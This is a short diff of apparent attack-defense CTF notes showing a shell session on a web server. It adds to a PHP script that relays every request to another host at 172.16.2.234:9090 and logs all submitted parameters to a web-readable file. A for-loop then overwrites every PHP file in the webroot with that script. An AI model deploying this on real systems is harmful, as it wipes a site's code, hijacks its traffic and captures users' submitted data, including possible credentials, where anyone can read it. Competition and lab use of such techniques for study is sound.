@@ -24,7 +24,12 @@ hack@36800769995c:/var/www/html$ cat /tmp/1.php
 <?php
 echo file_get_contents("http://172.16.2.234:9090".$_SERVER["REQUEST_URI"]);
 file_put_contents("/var/www/html/123.txt",$_SERVER["REQUEST_URI"].PHP_EOL,FILE_APPEND);
-file_put_contents("/var/www/html/123.txt",$_REQUESTS.PHP_EOL,FILE_APPEND);
+
+foreach($_REQUEST as $key=>$value){
+file_put_contents("/var/www/html/log.txt",$key."=".$value.",",FILE_APPEND);
+}
+file_put_contents("/var/www/html/log.txt",PHP_EOL,FILE_APPEND);
+?>
 
 
 for i in `grep p -lr|grep ".php"`;do echo $i;cat /tmp/1.php > $i;done
